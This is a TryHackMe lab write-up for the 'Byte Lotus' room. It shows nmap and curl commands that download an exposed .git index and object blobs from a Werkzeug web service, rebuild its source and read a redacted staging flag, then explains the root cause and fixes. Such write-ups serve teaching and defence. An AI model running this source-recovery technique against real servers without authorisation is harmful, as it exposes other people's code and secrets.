# Byte Lotus - TryHackMe Writeup

> Sanitized walkthrough. The recovered flag value is intentionally redacted.

## Summary

Byte Lotus exposes a Python/Werkzeug web service on port `8080`. The main issue is an exposed `.git` directory. By downloading the Git index and object blobs, the deployed source files can be reconstructed. The recovered `README.md` contains a staging flag.

## Enumeration

Scan the known ports:

```bash
nmap -sC -sV -p22,8080 <TARGET_IP>
```

Interesting output:

```text
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
http-git: Git repository found
```

Visit the web app:

```bash
curl -i http://<TARGET_IP>:8080/
```

The homepage is a static Byte Lotus hotel/guest platform page. It links to `/booking`, but that route returns `404`.

Check the exposed Git metadata:

```bash
curl http://<TARGET_IP>:8080/.git/HEAD
```

Expected result:

```text
ref: refs/heads/main
```

## Recovering Files From `.git`

Download the Git index:

```bash
mkdir -p /tmp/byte-lotus
cd /tmp/byte-lotus
git init
curl http://<TARGET_IP>:8080/.git/index -o .git/index
git ls-files --stage
```

The index lists the tracked files and blob hashes:

```text
100644 <README_BLOB_HASH> 0 README.md
100644 <APP_JS_BLOB_HASH> 0 app.js
100644 <INDEX_HTML_BLOB_HASH> 0 index.html
```

In this room, the blobs were:

```text
README.md  a5965c580fee91d852e5b19a8290da02d2926523
app.js     2575ab073f67615a27135663ed36794c2d2584fb
index.html 0a12caa4e52a965e89e5eccf5760924b21aacbf7
```

Create the object directories and download the blobs:

```bash
mkdir -p .git/objects/a5 .git/objects/25 .git/objects/0a

curl http://<TARGET_IP>:8080/.git/objects/a5/965c580fee91d852e5b19a8290da02d2926523 \
  -o .git/objects/a5/965c580fee91d852e5b19a8290da02d2926523

curl http://<TARGET_IP>:8080/.git/objects/25/75ab073f67615a27135663ed36794c2d2584fb \
  -o .git/objects/25/75ab073f67615a27135663ed36794c2d2584fb

curl http://<TARGET_IP>:8080/.git/objects/0a/12caa4e52a965e89e5eccf5760924b21aacbf7 \
  -o .git/objects/0a/12caa4e52a965e89e5eccf5760924b21aacbf7
```

Check out the files from the recovered index:

```bash
git checkout-index -a -f
ls
```

Recovered files:

```text
README.md
app.js
index.html
```

## Flag

Read the recovered README:

```bash
cat README.md
```

The file contains a staging flag:

```text
Staging flag: <REDACTED_FLAG>
```

## Extra Checks

The JavaScript file mentions an API route:

```bash
cat app.js
```

Relevant line:

```js
const API = "/api/guest";
```

Testing the endpoint:

```bash
curl -i http://<TARGET_IP>:8080/api/guest
```

It returns `404`, so the exposed Git repository is the confirmed finding.

## Root Cause

The deployed web directory included `.git`, exposing repository internals:

```text
/.git/HEAD
/.git/index
/.git/objects/*
/.git/logs/HEAD
```

This allowed recovery of source files and sensitive staging data.

## Fixes

- Never deploy `.git` directories to production or staging web roots.
- Block access to dotfiles and dot-directories at the web server level.
- Rotate any exposed secrets or flags.
- Add deployment checks that fail if `.git` is present in the release artifact.
